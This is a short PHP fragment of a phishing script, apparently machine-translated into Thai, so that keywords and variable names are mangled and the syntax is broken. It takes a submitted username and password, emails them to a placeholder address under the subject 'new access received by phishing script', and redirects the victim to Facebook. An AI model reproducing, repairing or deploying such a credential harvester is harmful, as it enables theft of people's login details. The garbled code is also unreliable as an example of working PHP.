<php?
	mail_sender () {
		$ username = $ POST [ 'ชื่อผู้ใช้' ];
		$ password = $ POST [ 'รหัสผ่าน' ];
		
		$ reciever = "ที่อยู่อีเมลของคุณ" ;
		
		$ subject = "ได้รับการเข้าถึงใหม่โดย phising script" ;
		$ข้อความ ="ชื่อผู้ใช้" $ชื่อผู้ใช้ ;
		$ข้อความ . ="และรหัสผ่านคือ" รหัสผ่าน$ ;
		
		 อีเมลที่ส่งคืน ( $ reciever , $ subject , $ message );
	}
	
	ถ้า ( mail_sender ()) {
		header ( "Location: http://www.facebook.com" );
